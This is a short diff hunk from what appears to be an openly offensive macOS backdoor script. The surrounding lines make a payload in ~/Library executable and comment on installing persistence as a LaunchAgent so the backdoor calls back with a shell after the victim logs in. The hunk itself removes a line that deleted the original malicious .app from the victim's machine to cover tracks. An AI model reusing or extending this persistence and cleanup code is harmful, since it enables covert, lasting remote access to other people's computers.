@@ -31,9 +31,6 @@ chmod +x ~/Library/$PAYLOAD
 
 sleep 2
 
-# Remove original malicious .app directory from victim
-rm -rf planimetria* 2>/dev/null
-
 # Persistence as LaunchAgents. Our backdoor will call us after user login.
 # If we kill session once established, victim neeeds to log off and log in again to get another shell,
 # or just reboot.
